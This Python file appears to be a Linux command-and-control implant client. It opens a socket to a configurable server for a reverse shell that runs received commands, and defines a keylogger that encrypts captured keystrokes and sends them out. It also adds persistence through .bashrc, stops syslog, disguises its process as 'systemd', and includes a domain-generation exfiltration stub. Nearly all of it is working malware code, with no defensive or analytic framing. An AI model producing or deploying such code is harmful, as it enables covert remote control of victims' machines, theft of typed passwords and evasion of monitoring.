import os
import socket
import subprocess
import random
import string
import time
import threading
from cryptography.fernet import Fernet
from pynput.keyboard import Key, Listener

# Server configuration
SERVER_HOST = '0.0.0.0'  # Update this
SERVER_PORT = 4444

# Create a socket object
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the server
client_socket.connect((SERVER_HOST, SERVER_PORT))

log_file = "/tmp/keystrokes.txt"

# Persistence Method (.bashrc)
def add_stealthy_persistence():
    try:
        with open(os.path.expanduser('~/.bashrc'), 'a') as bashrc:
            bashrc.write('\n# Persistence\n')
            bashrc.write(f'python3 /path/to/c2_client.py &\n')
        return "Stealthy persistence added through .bashrc."
    except Exception as e:
        return f"Error adding stealthy persistence: {e}"

# Privilege Escalation Method
def check_sudo_privileges():
    try:
        result = subprocess.getoutput('sudo -n true')
        if "sudo:" not in result:
            return "Root privileges granted."
        else:
            return "Sudo access not available."
    except Exception as e:
        return f"Error checking sudo: {e}"

# Reverse Shell
def reverse_shell():
    while True:
        command = client_socket.recv(1024).decode()
        if command.lower() == "exit":
            break
        shell = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = shell.stdout.read() + shell.stderr.read()
        client_socket.send(output)

# Keylogging
def on_press(key):
    with open(log_file, "a") as f:
        f.write(f"{key} ")

def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

def send_keylogs(encryption_key):
    while True:
        time.sleep(120)  # Send every 2 minutes
        try:
            with open(log_file, "r") as f:
                keylog_data = f.read()

            cipher = Fernet(encryption_key)
            encrypted_keylogs = cipher.encrypt(keylog_data.encode())
            client_socket.send(encrypted_keylogs)
        except Exception as e:
            print(f"Error sending keylogs: {e}")
        open(log_file, "w").close()

# DGA Exfiltration
def generate_dga_domain(seed, length=12):
    random.seed(seed)
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length)) + ".com"

def dga_exfiltrate(data, encryption_key):
    timestamp = int(time.time())
    domain = generate_dga_domain(timestamp)
    cipher = Fernet(encryption_key)
    encrypted_data = cipher.encrypt(data.encode())
    print(f"Exfiltrating data to: {domain}")

# Anti-Detection
def disable_syslog():
    try:
        subprocess.run('sudo service rsyslog stop', shell=True, check=True)
        return "Syslog service disabled for anti-detection."
    except Exception as e:
        return f"Error disabling syslog: {e}"

def hide_process():
    try:
        process_name = "systemd"
        os.system(f'echo "{process_name}" > /proc/self/comm')
        return "Process name changed for stealth."
    except Exception as e:
        return f"Error hiding process: {e}"

# Execution starts here
add_stealthy_persistence()
disable_syslog()
hide_process()
reverse_shell()

